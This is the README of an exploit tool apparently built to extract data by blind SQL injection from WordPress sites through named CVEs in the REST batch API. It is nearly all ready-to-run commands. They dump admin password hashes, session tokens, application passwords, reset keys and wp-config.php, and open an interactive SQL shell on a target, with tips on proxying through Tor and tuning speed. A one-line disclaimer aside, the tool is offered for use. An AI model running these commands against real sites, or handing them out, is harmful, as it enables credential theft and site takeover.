# wp2blind
by saretawa

blind sqli extraction for CVE-2026-60137 / CVE-2026-63030
wordpress REST batch api route confusion no UNION needed
authorized pentesting and educational use only

## install

```bash
pip install -r requirements.txt
```

## modes

```
check        confirm oracle works
read         extract anything from db
wpconfig     auto grab wp-config.php via LOAD_FILE
stacktest    check if stacked queries work
shell        interactive sql shell
```

## quick start

```bash
# is it vulnerable
python3 wp2blind.py check http://target --delay 3

# grab admin hash
python3 wp2blind.py read http://target --preset users --delay 3

# grab session token
python3 wp2blind.py read http://target --preset session_tokens --delay 3

# grab wp-config
python3 wp2blind.py wpconfig http://target --delay 3 --max-len 4096

# custom sql
python3 wp2blind.py read http://target --delay 3 --expr "SELECT user_pass FROM wp_users LIMIT 1"

# interactive
python3 wp2blind.py shell http://target --delay 3
```

## proxy

```bash
--proxy http://127.0.0.1:8080       burp
--proxy socks5://127.0.0.1:9050     socks5
```

self signed cert add --no-verify

## threading

default is 1 thread most reliable
bump it on stable links

```bash
--threads 3    good balance
--threads 5    fast stable links
```

dont go above 5 on slow targets timing gets corrupted
calibration always single threaded

## presets

```
version           @@version
database          DATABASE()
db_user           CURRENT_USER()
hostname          @@hostname
datadir           @@datadir
basedir           @@basedir
secure_file       @@secure_file_priv
file_priv         LOAD_FILE permission check
tables            all tables in db
prefix            wp table prefix
users             admin login and hash
all_users         all users and hashes
session_tokens    active sessions from usermeta
app_passwords     application passwords
secret_keys       auth keys and salts from wp_options
siteurl           site url
admin_email       admin email
activation_key    password reset key
```

## flags

```
--delay       sleep seconds per bit        default 2.0
--repeats     probes per bit               default 1
--rounds      calibration rounds           default 3
--timeout     request timeout              default 20
--max-len     max chars to extract         default 256
--prefix      table prefix                 default wp_
--threads     parallel threads             default 1
--output      save results to file
--no-verify   skip tls verification
--no-color    no ansi colors
--verbose     show request timing
--quiet       suppress banner
```

## shell

```
.presets          list presets
.delay 3          change delay and recalibrate
.maxlen 512       change max length
.threads 2        change threads
.prefix wp2_      change table prefix
.exit             exit
```

or just type sql directly

```
wp2blind> SELECT option_value FROM wp_options WHERE option_name='siteurl'
wp2blind> users
wp2blind> @@version
```

## notes

session_tokens stores sha256 of the real token not the token itself so cookie forging needs more steps

secret_keys are usually in wp-config.php not the db so empty result there is expected

if UNION works just use the original wp2shell poc this tool is for when it doesnt
